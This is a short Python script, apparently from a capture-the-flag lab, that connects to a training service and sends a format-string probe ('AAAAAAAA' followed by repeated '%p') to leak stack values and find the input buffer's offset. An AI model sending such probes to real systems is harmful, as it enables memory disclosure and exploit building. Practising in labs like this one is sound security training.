import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "chatelaine.cylabacademy.net", 17681
s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(5)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"AAAAAAAA" + b".%p" * 20 + b"\n")
time.sleep(0.8)
out = b""
try:
    out = s.recv(16384)
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print(txt[:1200])
# le buffer contient 41414141...
m = re.search(r"0x4141414141414141", txt)
print("\nbuffer trouve comme valeur:", bool(m))
s.close()
